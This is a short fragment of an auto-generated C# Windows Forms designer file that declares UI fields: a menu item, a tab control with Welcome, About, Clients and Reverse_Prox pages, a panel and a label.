        private System.Windows.Forms.ToolStripMenuItem extreme1004000RQToolStripMenuItem;
        private System.Windows.Forms.TabControl tabControl1;
        private System.Windows.Forms.TabPage Welcome;
        private System.Windows.Forms.TabPage About;
        private System.Windows.Forms.TabPage Clients;
        private System.Windows.Forms.TabPage Reverse_Prox;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Label label1;
    }
}

